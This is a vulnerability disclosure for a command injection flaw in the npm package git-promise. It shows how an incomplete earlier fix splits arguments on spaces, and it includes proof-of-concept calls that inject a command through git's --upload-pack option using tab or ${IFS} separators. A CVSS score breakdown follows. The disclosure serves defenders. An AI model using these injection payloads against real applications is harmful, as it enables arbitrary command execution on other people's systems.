Command Injection vulnerability in git-promise@1.0.0

 [Raw](/lirantal/9da1fceb32f5279eb76a5fc1cb9707dd/raw/5ab5f820f7379c092941c193aa59eb400e03737d/git-promise-command-injection.md)

# Command Injection vulnerability in git-promise@1.0.0

`git-promise` describes itself as a simple wrapper that allows you to run any git command using a more intuitive syntax.

Resources:

* Project's GitHub source code: <https://github.com/piuccio/git-promise>
* Project's npm package: <https://snyk.io/vuln/npm%3Agit-promise>

## Background on exploitation

I'm reporting a Command Injection vulnerability in `git-promise` npm package.

The vector of attack in this vulnerability was found to be possible after investigating prior Remote Code Execution vulnerability as described here <https://security.snyk.io/vuln/SNYK-JS-GITPROMISE-567476> and an inappropriate fix.

The fix to the prior command injection vulnerability was made with this pull request <https://github.com/piuccio/git-promise/pull/8/files#diff-e727e4bdf3657fd1d798edcd6b099d6e092f8573cba266154583a746bba0f346L34-L49> in which we can see how the `index.js` file changes the old API of executing a process via `shell.exec()` which concatenates strings for one command, with a new API `execFile(execBinary, execArguments, execOptions)` which separates the git binary from user input passed to it in `execArguments`.

However, the logic applied in this pull request to separate command arguments uses the a "split by whitespace" way of doing so, as can be shown in this pull request's suggested changes here: <https://github.com/piuccio/git-promise/pull/8/files#diff-e727e4bdf3657fd1d798edcd6b099d6e092f8573cba266154583a746bba0f346R31-R34>

## New exploit

Why is the previous fix flawed and where does the vulnerability come from?

Recent git-related CVEs have shown a vector of command injection via the `git fetch --upload-pack=touch /tmp/abc`. Let's see if this works:

```
const git = require("git-promise");
git("fetch origin --upload-pack=touch /tmp/abcd", {cwd: '/tmp/example-git-repo'}).then((output) => console.log(output))
```

If you run this program then the file `/tmp/abcd` isn't created because the whitespace separation logic puts "/tmp/abcd" from the above user input into its own command line argument, thus failing.

However, see the following 2 proofs-of-concept exploits that both bypass the space character split logic:

```
// POC1
const git = require("git-promise");
// Use tab instead of spaces to separate between the touch command and its argument
git("fetch origin --upload-pack=touch	/tmp/abcd", {cwd: '/tmp/example-git-repo'}).then((output) => console.log(output))
```

```
// POC2
const git = require("git-promise");
// Use the shell's predefined separator using ${IFS} to escape the whitespace splitting logic
git("fetch origin --upload-pack=touch${IFS}/tmp/abcd-new", {cwd: '/tmp/example-git-repo'}).then((output) => console.log(output))
```

## How to fix?

There is no fixed version for `git-promise`.

## Overview

[git-promise](https://www.npmjs.com/package/git-promise) is a Simple wrapper that allows you to run any git command using a more intuitive syntax.

Affected versions of this package are vulnerable to Command Injection due to an inappropriate fix of a prior [vulnerability](https://security.snyk.io/vuln/SNYK-JS-GITPROMISE-567476) in this package.
**Note:** Please note that the vulnerability will not be fixed. The README file was updated with a warning regarding this issue.

## PoC 1

```
const git = require("git-promise");
// Use tab instead of spaces to separate between the touch command and its argument
git("fetch origin --upload-pack=touch	/tmp/abcd", {cwd: '/tmp/example-git-repo'}).then((output) => console.log(output))

```
## PoC 2

```
const git = require("git-promise");
// Use the shell's predefined separator using ${IFS} to escape the whitespace splitting logic
git("fetch origin --upload-pack=touch${IFS}/tmp/abcd-new", {cwd: '/tmp/example-git-repo'}).then((output) => console.log(output))

### CVSS Scores

version 3.1
### Snyk

7.2 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker requires privileges that provide significant (e.g., administrative) control over the vulnerable component allowing access to component-wide settings and files.

  **High**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
